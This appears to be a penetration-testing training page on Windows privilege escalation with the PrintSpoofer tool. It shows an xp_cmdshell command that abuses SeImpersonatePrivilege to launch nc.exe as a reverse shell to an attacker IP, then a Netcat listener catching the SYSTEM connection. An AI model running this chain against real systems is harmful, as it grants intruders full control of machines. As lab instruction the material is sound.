# PrintSpoofer

{% hint style="info" %}
#### Version

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
{% endhint %}

## Example

Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...

NULL 
```

### **Catching Reverse Shell as SYSTEM**

If all goes according to plan, we will have a SYSTEM shell on our netcat listener.

```shell-session
McClewR@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847

Escalating privileges by leveraging `SeImpersonate` is very common. It is essential to be familiar with the various methods available to us depending on the target host OS version and level.
